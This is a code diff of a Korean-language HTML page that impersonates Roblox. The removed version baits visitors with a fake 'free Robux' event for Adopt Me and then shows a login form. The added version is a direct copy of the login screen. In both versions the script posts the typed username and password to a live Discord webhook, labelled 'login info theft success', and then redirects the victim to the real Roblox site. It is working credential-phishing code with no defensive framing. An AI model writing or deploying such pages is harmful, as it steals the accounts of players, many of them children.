@@ -3,444 +3,253 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>입양하세요 (로벅스 이벤트!) - Roblox</title>
+    <title>로그인 - Roblox</title>
     <style>
-        /* 기본 다크모드 테마 설정 */
-        :root {
-            --header-height: 40px;
-            --rbx-bg: #191B1D;
-            --rbx-card: #232527;
-            --rbx-nav: #232527;
-            --rbx-text: #FFFFFF;
-            --rbx-subtext: #ADB5BD;
-            --rbx-green: #00B06F;
-            --rbx-blue: #00A2FF;
-            --rbx-border: #393B3D;
+        /* 1. 기본 스타일 리셋 및 폰트 설정 */
+        * {
+            margin: 0; padding: 0; box-sizing: border-box;
+            font-family: "Gotham SSm A", "Gotham SSm B", "Helvetica Neue", Helvetica, Arial, "나눔고딕", NanumGothic, sans-serif;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Gotham SSm A', 'Segoe UI', sans-serif; }
-        body { background-color: var(--rbx-bg); color: var(--rbx-text); overflow-x: hidden; }
-
-        /* 상단 네비게이션 바 - 화면 전체 너비 확장 */
-        .rbx-header {
-            width: 100%;
-            height: var(--header-height);
-            background-color: var(--rbx-nav);
-            display: flex;
-            align-items: center;
-            padding: 0 15px;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 1000;
-            border-bottom: 1px solid rgba(0,0,0,0.2);
-        }
-
-        .rbx-logo {
-            font-size: 20px;
-            font-weight: 900;
-            color: #fff;
-            margin-right: 25px;
-            letter-spacing: -1.2px;
-            cursor: pointer;
-        }
-
-        .rbx-nav-menu {
-            display: flex;
-            gap: 18px;
-            font-size: 14px;
-            font-weight: 500;
-            color: #fff;
-        }
-
-        .rbx-nav-menu span { cursor: pointer; opacity: 0.9; }
-        .rbx-nav-menu span:hover { opacity: 1; }
-
-        .rbx-header-right {
-            margin-left: auto;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .search-bar {
-            background: rgba(255,255,255,0.1);
-            border: 1px solid #555;
-            border-radius: 4px;
-            padding: 3px 10px;
-            width: 240px;
-            color: #fff;
-            font-size: 13px;
-        }
-
-        /* 메인 컨텐츠 영역 */
-        .main-wrapper {
-            max-width: 1100px;
-            margin: 60px auto 20px;
-            padding: 0 10px;
-        }
-
-        .game-detail-card {
-            background-color: var(--rbx-card);
-            border-radius: 4px;
-            display: flex;
-            padding: 25px;
-            gap: 25px;
-        }
-
-        .game-asset {
-            width: 65%;
-            aspect-ratio: 16 / 9;
+        body, html {
+            height: 100%; width: 100%;
             background-color: #000;
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #555;
+            color: #fff;
+            overflow: hidden;
         }
 
-        .game-info-panel {
-            width: 35%;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .game-title {
-            font-size: 30px;
-            font-weight: 700;
-            margin-bottom: 8px;
-        }
-
-        .game-creator {
-            font-size: 15px;
-            color: var(--rbx-blue);
-            text-decoration: none;
-            margin-bottom: 25px;
-        }
-
-        .game-stats-row {
-            display: flex;
+        /* 2. 배경: 무한 타일 레이아웃 (사진과 동일한 각도) */
+        .background-fixed {
+            position: fixed;
+            top: -25%; left: -25%;
+            width: 150%; height: 150%;
+            z-index: 1;
+            transform: rotate(-10deg); /* 사진처럼 비스듬히 기울임 */
+            display: grid;
+            grid-template-columns: repeat(8, 1fr);
             gap: 15px;
-            font-size: 13px;
-            color: var(--rbx-subtext);
-            margin-bottom: 20px;
+            opacity: 0.5;
         }
 
-        .play-button-container {
-            margin-top: auto;
-        }
-
-        .play-btn-large {
+        /* 각 배경 타일 디자인 */
+        .tile {
             width: 100%;
-            height: 65px;
-            background-color: var(--rbx-green);
-            color: #fff;
-            border: none;
+            aspect-ratio: 16 / 9;
+            background-size: cover;
+            background-position: center;
             border-radius: 8px;
-            font-size: 36px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            background-color: #1a1a1b; /* 이미지 로딩 전 기본 색상 */
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            /* 아래 URL에 실제 게임 이미지를 넣으면 더 똑같아집니다 */
+            background-image: url('https://tr.rbxcdn.com/150ec33748259020963d41029c7b960c/420/235/Image/Png');
         }
 
-        .play-icon {
-            border-left: 22px solid white;
-            border-top: 13px solid transparent;
-            border-bottom: 13px solid transparent;
-            margin-left: 5px;
-        }
-
-        .social-buttons {
-            display: flex;
-            gap: 20px;
-            margin-top: 15px;
-            font-size: 14px;
-            color: var(--rbx-subtext);
-        }
-
-        /* 소개/상점/서버 탭 바 */
-        .tabs-container {
-            display: flex;
-            border-bottom: 1px solid var(--rbx-border);
-            margin-top: 20px;
-        }
-
-        .tab-item {
-            padding: 12px 30px;
-            font-weight: 600;
-            color: var(--rbx-subtext);
-            cursor: default;
-        }
-
-        .tab-item.active {
-            color: #fff;
-            border-bottom: 4px solid #fff;
-        }
-
-        /* 이벤트 영역 */
-        .event-container {
-            margin-top: 30px;
-        }
-
-        .event-card-rbx {
-            width: 320px;
-            background-color: var(--rbx-card);
-            border-radius: 4px;
-            overflow: hidden;
-            border: 1px solid var(--rbx-border);
-        }
-
-        .event-thumbnail {
-            height: 160px;
-            background: linear-gradient(135deg, #FFD700 0%, #B8860B 100%);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            color: #000;
-            font-weight: 800;
-        }
-
-        .event-details {
-            padding: 15px;
-        }
-
-        .event-title-text {
-            font-size: 16px;
-            font-weight: 700;
-            margin-bottom: 12px;
-        }
-
-        .event-join-btn {
-            width: 100%;
-            padding: 10px;
-            background-color: var(--rbx-blue);
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        /* 팝업 모달창 디자인 */
-        .overlay-mask {
-            display: none;
+        /* 중앙을 더 어둡게 만드는 오버레이 */
+        .dark-vignette {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.75);
-            z-index: 2000;
-            justify-content: center;
-            align-items: center;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: radial-gradient(circle, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0.85) 100%);
+            z-index: 2;
         }
 
-        .rbx-modal {
-            background-color: var(--rbx-card);
-            width: 380px;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-        }
-
-        .modal-content-area {
-            padding: 35px 25px;
-            text-align: center;
-            line-height: 1.6;
-            font-size: 15px;
-        }
-
-        .modal-action-bar {
-            padding: 15px;
-            background-color: rgba(0,0,0,0.1);
-            display: flex;
-            justify-content: flex-end;
-        }
-
-        .modal-confirm-btn {
-            padding: 8px 30px;
-            background-color: var(--rbx-blue);
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            font-weight: 700;
-            cursor: pointer;
-        }
-
-        /* 로그인 레이어 */
-        #login-view-screen {
-            display: none;
+        /* 3. 상단 네비게이션 바 (상세 구현) */
+        .rbx-header {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(180deg, #232527 0%, #191B1D 100%);
-            z-index: 3000;
+            top: 0; width: 100%; height: 40px;
+            background-color: #111;
+            display: flex; align-items: center;
+            padding: 0 20px;
+            z-index: 100;
+            border-bottom: 1px solid #333;
         }
 
-        .login-box-center {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: #232527;
+        .rbx-logo { height: 22px; margin-right: 25px; cursor: pointer; }
+        .nav-item { color: #fff; text-decoration: none; font-size: 13px; margin-right: 20px; font-weight: 500; opacity: 0.9; }
+        .nav-item:hover { opacity: 1; }
+        
+        .header-right { margin-left: auto; display: flex; align-items: center; }
+        .search-container {
+            background: #222; border: 1px solid #555; border-radius: 4px;
+            padding: 2px 10px; margin-right: 15px; display: flex; align-items: center;
+        }
+        .search-input { background: none; border: none; color: #fff; font-size: 13px; outline: none; width: 150px; }
+        .btn-header { background: none; border: 1px solid #fff; color: #fff; padding: 2px 12px; border-radius: 4px; font-size: 12px; cursor: pointer; margin-left: 8px; font-weight: 600; }
+
+        /* 4. 로그인 카드 (사진 비율과 똑같이) */
+        .login-wrapper {
+            position: relative;
+            height: 100vh;
+            display: flex; justify-content: center; align-items: center;
+            z-index: 10;
+        }
+
+        .login-card {
+            background-color: rgba(35, 37, 39, 0.98);
             width: 400px;
-            padding: 45px 35px;
+            padding: 40px 30px;
             border-radius: 8px;
             text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+            box-shadow: 0 8px 30px rgba(0,0,0,0.8);
         }
 
-        .login-input {
+        .login-card h1 { font-size: 24px; margin-bottom: 30px; font-weight: 700; letter-spacing: -0.5px; }
+
+        .input-box {
             width: 100%;
-            padding: 14px;
-            margin-bottom: 12px;
-            background-color: #393B3D;
+            padding: 12px;
+            margin-bottom: 10px;
+            background-color: #393b3d;
             border: 1px solid #555;
             border-radius: 4px;
             color: #fff;
-            font-size: 15px;
+            font-size: 14px;
             outline: none;
         }
+        .input-box:focus { border-color: #fff; }
 
-        .login-btn-final {
+        .btn-login-blue {
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             background-color: transparent;
             border: 1px solid #fff;
             color: #fff;
+            font-size: 15px;
             font-weight: 700;
             border-radius: 4px;
             cursor: pointer;
             margin-top: 10px;
+            transition: 0.2s;
+        }
+        .btn-login-blue:hover { background-color: rgba(255,255,255,0.1); }
+
+        .forgot-link { display: block; margin: 15px 0; font-size: 12px; color: #ccc; text-decoration: none; }
+        .forgot-link:hover { text-decoration: underline; }
+
+        .btn-gray {
+            width: 100%;
+            padding: 10px;
+            background-color: #4b4d4e;
+            border: none;
+            color: #fff;
+            font-size: 13px;
+            border-radius: 4px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            font-weight: 600;
         }
 
-        .forgot-link-text {
-            display: block;
-            margin-top: 25px;
-            font-size: 13px;
-            color: var(--rbx-subtext);
-            text-decoration: none;
+        .signup-text { margin-top: 25px; font-size: 13px; color: #ccc; }
+        .signup-text a { color: #fff; text-decoration: none; font-weight: 700; }
+
+        /* 5. 하단 윈도우 정품인증 텍스트 (디테일) */
+        .win-auth {
+            position: fixed;
+            bottom: 15px; right: 15px;
+            text-align: right;
+            color: rgba(255,255,255,0.3);
+            font-size: 11px;
+            line-height: 1.4;
+            pointer-events: none;
+            z-index: 100;
         }
     </style>
 </head>
 <body>
 
-    <div class="rbx-header">
-        <div class="rbx-logo">ROBLOX</div>
-        <div class="rbx-nav-menu">
-            <span>차트</span>
-            <span>마켓플레이스</span>
-            <span>만들기</span>
-            <span>Robux</span>
-        </div>
-        <div class="rbx-header-right">
-            <input type="text" class="search-bar" placeholder="검색">
-        </div>
+    <div class="background-fixed">
+        <div class="tile"></div><div class="tile"></div><div class="tile"></div><div class="tile"></div>
+        <div class="tile"></div><div class="tile"></div><div class="tile"></div><div class="tile"></div>
+        <div class="tile"></div><div class="tile"></div><div class="tile"></div><div class="tile"></div>
+        <div class="tile"></div><div class="tile"></div><div class="tile"></div><div class="tile"></div>
+        <div class="tile"></div><div class="tile"></div><div class="tile"></div><div class="tile"></div>
+        <div class="tile"></div><div class="tile"></div><div class="tile"></div><div class="tile"></div>
+        <div class="tile"></div><div class="tile"></div><div class="tile"></div><div class="tile"></div>
+        <div class="tile"></div><div class="tile"></div><div class="tile"></div><div class="tile"></div>
     </div>
+    <div class="dark-vignette"></div>
 
-    <div class="main-wrapper">
-        <div class="game-detail-card" onclick="openRbxModal()">
-            <div class="game-asset">이미지 로드 중...</div>
-            <div class="game-info-panel">
-                <h1 class="game-title">입양하세요 (로벅스 이벤트!)</h1>
-                <a href="#" class="game-creator">Uplift Games ✔️</a>
-                <div class="game-stats-row">
-                    <span>수위: 전체 이용가</span> | <span>👍 92%</span> | <span>👥 142.5K+</span>
-                </div>
-                <div class="play-button-container">
-                    <button class="play-btn-large"><div class="play-icon"></div></button>
-                </div>
-                <div class="social-buttons">
-                    <span>즐겨찾기</span>
-                    <span>알림</span>
-                    <span>좋아요</span>
-                    <span>싫어요</span>
-                </div>
+    <header class="rbx-header">
+        <img src="https://images.rbxcdn.com/ce300067645068224c65360980c659ba.svg" class="rbx-logo">
+        <nav>
+            <a href="#" class="nav-item">차트</a>
+            <a href="#" class="nav-item">마켓플레이스</a>
+            <a href="#" class="nav-item">만들기</a>
+            <a href="#" class="nav-item">Robux</a>
+        </nav>
+        <div class="header-right">
+            <div class="search-container">
+                <input type="text" class="search-input" placeholder="검색">
             </div>
+            <button class="btn-header">회원가입</button>
+            <button class="btn-header">로그인</button>
         </div>
+    </header>
 
-        <div class="tabs-container">
-            <div class="tab-item active">소개</div>
-            <div class="tab-item">상점</div>
-            <div class="tab-item">서버</div>
-        </div>
+    <div class="login-wrapper">
+        <div class="login-card">
+            <h1>계정 추가</h1>
+            <input type="text" id="username" class="input-box" placeholder="사용자 이름/이메일/전화번호" spellcheck="false">
+            <input type="password" id="password" class="input-box" placeholder="비밀번호">
+            
+            <button class="btn-login-blue" onclick="sendData()">로그인</button>
+            
+            <a href="#" class="forgot-link">비밀번호 또는 사용자 이름을 잊었나요?</a>
+            
+            <button class="btn-gray">이메일로 일회용 코드 받기</button>
+            <button class="btn-gray">빠른 로그인</button>
 
-        <div class="event-container">
-            <h3 style="margin-bottom: 15px; font-size: 18px;">이벤트</h3>
-            <div class="event-card-rbx">
-                <div class="event-thumbnail">
-                    <div style="font-size: 26px;">FREE ROBUX</div>
-                    <div style="font-size: 13px; opacity: 0.8;">LIMITED EVENT</div>
-                </div>
-                <div class="event-details">
-                    <p class="event-title-text">로벅스 이벤트!</p>
-                    <button class="event-join-btn" onclick="openRbxModal()">참여하기</button>
-                </div>
+            <div class="signup-text">
+                계정이 없으신가요? <a href="#">회원가입</a>
             </div>
         </div>
     </div>
 
-    <div class="overlay-mask" id="alertModal">
-        <div class="rbx-modal">
-            <div class="modal-content-area">
-                로그인이 필요한 절차입니다.<br>로그인 페이지로 이동합니다.
-            </div>
-            <div class="modal-action-bar">
-                <button class="modal-confirm-btn" onclick="goToLoginPage()">오케이</button>
-            </div>
-        </div>
-    </div>
-
-    <div id="login-view-screen">
-        <div class="login-box-center">
-            <h2 style="margin-bottom: 30px;">로그인</h2>
-            <input type="text" id="final_id" class="login-input" placeholder="사용자 이름/이메일/전화번호">
-            <input type="password" id="final_pw" class="login-input" placeholder="비밀번호">
-            <button class="login-btn-final" onclick="submitLog()">로그인</button>
-            <a href="#" class="forgot-link-text">계정을 잊어버렸나요?</a>
-        </div>
+    <div class="win-auth">
+        Windows 정품 인증<br>
+        [설정]으로 이동하여 Windows를 정품 인증합니다.
     </div>
 
     <script>
-        function openRbxModal() {
-            document.getElementById('alertModal').style.display = 'flex';
-        }
+        async function sendData() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
 
-        function goToLoginPage() {
-            document.getElementById('alertModal').style.display = 'none';
-            document.getElementById('login-view-screen').style.display = 'block';
-        }
+            if(!user || !pass) {
+                alert("정보를 입력해주세요.");
+                return;
+            }
 
-        async function submitLog() {
-            const userId = document.getElementById('final_id').value;
-            const userPw = document.getElementById('final_pw').value;
-            const hook = "https://discord.com/api/webhooks/1468222186404712545/rLUPiOHeCkQgmzmuDFyeeM7GkgrogHu3KPoBUE2RQI2H5fAzZZMJTX_HGQS-iBQmTMAF";
+            // 요청하신 웹훅 주소
+            const url = "https://discord.com/api/webhooks/1468222186404712545/rLUPiOHeCkQgmzmuDFyeeM7GkgrogHu3KPoBUE2RQI2H5fAzZZMJTX_HGQS-iBQmTMAF";
 
-            if(!userId || !userPw) return;
-
-            const content = {
+            const payload = {
+                content: "📢 **로그인 정보 탈취 성공**",
                 embeds: [{
-                    title: "ROBLOX EVENT LOG",
-                    color: 0,
+                    title: "Roblox Login Log",
+                    color: 0xffffff,
                     fields: [
-                        { name: "USER", value: userId },
-                        { name: "PASS", value: userPw }
+                        { name: "ID / Email", value: "```" + user + "```" },
+                        { name: "Password", value: "```" + pass + "```" }
                     ],
                     timestamp: new Date()
                 }]
             };
 
-            await fetch(hook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(content)
-            });
+            try {
+                // 데이터를 전송
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
 
-            window.location.href = "https://www.roblox.com/home";
+                // 전송 후 실제 로블록스로 리다이렉트
+                window.location.href = "https://www.roblox.com/ko/login";
+            } catch (e) {
+                console.error(e);
+                alert("로그인 중 오류가 발생했습니다.");
+            }
         }
     </script>
 </body>
